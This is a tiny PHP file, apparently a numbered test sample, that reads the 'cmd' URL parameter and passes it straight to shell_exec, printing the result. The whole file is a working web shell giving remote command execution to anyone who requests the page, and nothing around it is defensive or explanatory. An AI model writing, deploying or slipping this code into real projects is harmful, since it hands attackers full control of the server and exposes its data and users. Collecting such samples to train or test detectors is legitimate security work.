<?php
// RCE test variation #776
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>